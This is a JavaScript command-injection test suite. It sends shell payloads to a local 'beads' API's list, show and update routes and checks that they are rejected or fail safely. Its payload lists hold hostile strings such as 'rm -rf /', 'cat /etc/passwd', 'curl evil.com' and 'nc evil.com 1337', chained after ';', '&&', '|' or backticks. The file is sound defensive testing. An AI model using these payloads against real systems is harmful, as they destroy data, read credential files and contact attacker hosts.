const BASE_URL = 'http://localhost:3000';

const maliciousPayloads = {
  beadIds: [
    'test; rm -rf /',
    'test && echo hacked',
    'test | cat /etc/passwd',
    'test`whoami`',
    'test$(whoami)',
    'test\nrm -rf /',
    'test;whoami;',
    '../../../etc/passwd',
    'test&&curl evil.com',
    'test|nc evil.com 1337',
  ],
  queryParams: [
    '; rm -rf /',
    '&& echo hacked',
    '| cat /etc/passwd',
    '`whoami`',
    '$(whoami)',
    '\nrm -rf /',
    ';whoami;',
    '|| curl evil.com',
    '& nc evil.com 1337',
  ],
  priorities: [
    '0; rm -rf /',
    '$(whoami)',
    '`id`',
    '999999',
    '-1',
    'HIGH',
    '0 && echo hacked',
  ],
};

async function testBeadsList() {
  console.log('\n=== Testing GET /api/beads (List) ===');

  const testCases = [
    { name: 'status injection', param: 'status', values: maliciousPayloads.queryParams },
    { name: 'assignee injection', param: 'assignee', values: maliciousPayloads.queryParams },
    { name: 'type injection', param: 'type', values: maliciousPayloads.queryParams },
    { name: 'priority injection', param: 'priority', values: maliciousPayloads.priorities },
  ];

  let passed = 0;
  let failed = 0;

  for (const testCase of testCases) {
    console.log(`\nTesting ${testCase.name}:`);

    for (const value of testCase.values) {
      try {
        const url = `${BASE_URL}/api/beads?${testCase.param}=${encodeURIComponent(value)}`;
        const response = await fetch(url);
        const data = await response.json();

        if (response.status === 400 && data.error) {
          console.log(`  ✓ PASS: Rejected "${value.substring(0, 30)}" with 400`);
          passed++;
        } else if (response.status === 200) {
          console.log(`  ✓ PASS: Safely handled "${value.substring(0, 30)}" (returned empty or sanitized)`);
          passed++;
        } else {
          console.log(`  ✗ FAIL: Unexpected response for "${value}" - Status: ${response.status}`);
          failed++;
        }
      } catch (error) {
        console.log(`  ✗ FAIL: Error testing "${value}": ${error.message}`);
        failed++;
      }
    }
  }

  return { passed, failed };
}

async function testBeadShow() {
  console.log('\n=== Testing GET /api/beads/[id] (Show) ===');

  let passed = 0;
  let failed = 0;

  for (const maliciousId of maliciousPayloads.beadIds) {
    try {
      const url = `${BASE_URL}/api/beads/${encodeURIComponent(maliciousId)}`;
      const response = await fetch(url);
      const data = await response.json();

      if (response.status === 400 && data.error === 'Invalid bead ID format') {
        console.log(`  ✓ PASS: Rejected bead ID "${maliciousId.substring(0, 30)}"`);
        passed++;
      } else if (response.status === 500 && data.code === 'BD_SHOW_ERROR') {
        console.log(`  ✓ PASS: Command failed safely for "${maliciousId.substring(0, 30)}"`);
        passed++;
      } else {
        console.log(`  ✗ FAIL: Unexpected response for "${maliciousId}" - Status: ${response.status}`);
        failed++;
      }
    } catch (error) {
      console.log(`  ✗ FAIL: Error testing "${maliciousId}": ${error.message}`);
      failed++;
    }
  }

  return { passed, failed };
}

async function testBeadUpdate() {
  console.log('\n=== Testing PATCH /api/beads/[id] (Update) ===');

  let passed = 0;
  let failed = 0;

  console.log('\nTesting malicious bead IDs:');
  for (const maliciousId of maliciousPayloads.beadIds.slice(0, 5)) {
    try {
      const url = `${BASE_URL}/api/beads/${encodeURIComponent(maliciousId)}`;
      const response = await fetch(url, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'in_progress' }),
      });
      const data = await response.json();

      if (response.status === 400 && data.error === 'Invalid bead ID format') {
        console.log(`  ✓ PASS: Rejected bead ID "${maliciousId.substring(0, 30)}"`);
        passed++;
      } else {
        console.log(`  ✗ FAIL: Did not reject malicious ID "${maliciousId}"`);
        failed++;
      }
    } catch (error) {
      console.log(`  ✗ FAIL: Error testing "${maliciousId}": ${error.message}`);
      failed++;
    }
  }

  console.log('\nTesting malicious field values on valid ID:');
  const validId = 'test-bead-123';

  const fieldTests = [
    { field: 'status', values: maliciousPayloads.queryParams.slice(0, 5) },
    { field: 'assignee', values: maliciousPayloads.queryParams.slice(0, 5) },
    { field: 'priority', values: maliciousPayloads.priorities.slice(0, 5) },
  ];

  for (const fieldTest of fieldTests) {
    console.log(`\nTesting ${fieldTest.field} field:`);

    for (const value of fieldTest.values) {
      try {
        const url = `${BASE_URL}/api/beads/${validId}`;
        const body = { [fieldTest.field]: value };
        const response = await fetch(url, {
          method: 'PATCH',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
        });
        const data = await response.json();

        if (response.status === 400 && data.error && data.error.includes('Invalid')) {
          console.log(`  ✓ PASS: Rejected ${fieldTest.field}="${value.substring(0, 30)}"`);
          passed++;
        } else if (response.status === 500) {
          console.log(`  ✓ PASS: Command failed safely for ${fieldTest.field}="${value.substring(0, 30)}"`);
          passed++;
        } else {
          console.log(`  ✗ FAIL: Unexpected response for ${fieldTest.field}="${value}"`);
          failed++;
        }
      } catch (error) {
        console.log(`  ✗ FAIL: Error testing ${fieldTest.field}="${value}": ${error.message}`);
        failed++;
      }
    }
  }

  return { passed, failed };
}

async function runSecurityTests() {
  console.log('===========================================');
  console.log('   COMMAND INJECTION SECURITY TEST SUITE');
  console.log('===========================================');
  console.log('Testing: app/api/beads routes');
  console.log('Target: Validate command injection fixes');
  console.log('===========================================');

  const results = {
    list: await testBeadsList(),
    show: await testBeadShow(),
    update: await testBeadUpdate(),
  };

  console.log('\n===========================================');
  console.log('              TEST SUMMARY');
  console.log('===========================================');
  console.log(`GET /api/beads:       ${results.list.passed} passed, ${results.list.failed} failed`);
  console.log(`GET /api/beads/[id]:  ${results.show.passed} passed, ${results.show.failed} failed`);
  console.log(`PATCH /api/beads/[id]: ${results.update.passed} passed, ${results.update.failed} failed`);

  const totalPassed = results.list.passed + results.show.passed + results.update.passed;
  const totalFailed = results.list.failed + results.show.failed + results.update.failed;
  const totalTests = totalPassed + totalFailed;

  console.log('-------------------------------------------');
  console.log(`TOTAL: ${totalPassed}/${totalTests} tests passed`);
  console.log('===========================================');

  if (totalFailed === 0) {
    console.log('\n✓ ALL SECURITY TESTS PASSED');
    console.log('Command injection vulnerabilities are properly mitigated.');
    return 0;
  } else {
    console.log(`\n✗ ${totalFailed} SECURITY TESTS FAILED`);
    console.log('Review the failed tests above.');
    return 1;
  }
}

runSecurityTests()
  .then(exitCode => process.exit(exitCode))
  .catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
  });
